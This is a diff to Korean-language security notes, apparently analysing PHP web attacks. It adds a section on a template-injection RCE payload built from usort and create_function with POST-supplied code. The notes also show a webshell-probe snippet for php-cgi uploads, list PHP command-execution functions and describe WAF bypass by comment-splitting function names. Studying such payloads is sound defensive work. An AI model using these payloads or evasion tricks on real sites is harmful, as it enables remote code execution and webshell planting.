@@ -223,7 +223,7 @@ https://www.we.net/php-cgi/php-cgi.exe?
 ---
 
 
-### 📎 예제 2-3. php-cgi : 파일 업로드/POST(멀티파트)형태로 PHP 코드(웹셸) 전송
+## 📎 예제 2-3. php-cgi : 파일 업로드/POST(멀티파트)형태로 PHP 코드(웹셸) 전송
 
 ```
 ,<?php echo md5('999999999'); unlink(__FILE__); ?> 
@@ -316,5 +316,49 @@ echo stream_get_contents($sp71a4e7[1]);
 
 * `system('command')`, `exec('command', $out)`, `shell_exec('command')`, `` `command` `` (백틱), `popen()`, `passthru()`
 * `proc_open`은 더 정교한 I/O 제어가 가능해서 선호되기도 함.
+
+
+---
+## 📎 예제 3-1. PHP 구버전의  `create_function`과 `usort()` 을 통한 RCE
+
+서버가 입력값을 **eval, include, unserialize, preg\_replace** 등으로 실행하게 만들어서
+**임의 코드 실행** → **웹쉘 삽입** → **시스템 장악**
+
+```txt
+tag/index=&tag={
+  pbohome/Indexot:if(1)(
+    usort(
+      post(1),
+      create_function(
+        post(2),
+        post(3)
+      )
+    )
+  );
+}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue
+```
+
+(※ `%7B`, `%7D` → `{`, `}`,
+`/*%3e*/` → `/*>*/` 로 변형해 난독화된 상태)
+
+
+### 1. **`create_function` 사용**
+
+```php
+create_function(post(2), post(3))
+```
+
+* 이는 PHP의 오래된 함수로, 문자열 형태의 코드를 함수로 생성할 수 있음.
+* PHP 7.2 이후 제거되었지만, **구버전에서는 치명적인 RCE 수단**으로 쓰임.
+
+### 2. **`usort(post(1), ..., ...)`**
+
+* `usort()`은 배열 정렬 함수인데, 콜백 함수에 **임의 코드 실행을 유도**할 수 있음.
+* `post(n)` 구조는 공격자가 자신이 원하는 데이터를 POST로 넘기겠다는 의미일 수 있음.
+
+### 3. **난독화 (`/*%3e*/`, 중첩 괄호, `tag=` 파라미터 활용 등)**
+
+* 필터 우회를 위해 일부 문자들을 주석 처리하거나 인코딩
+* 예: WAF가 `create_function`을 막더라도 `cre/*>*/ate_function`처럼 쪼개면 우회 가능
 
 
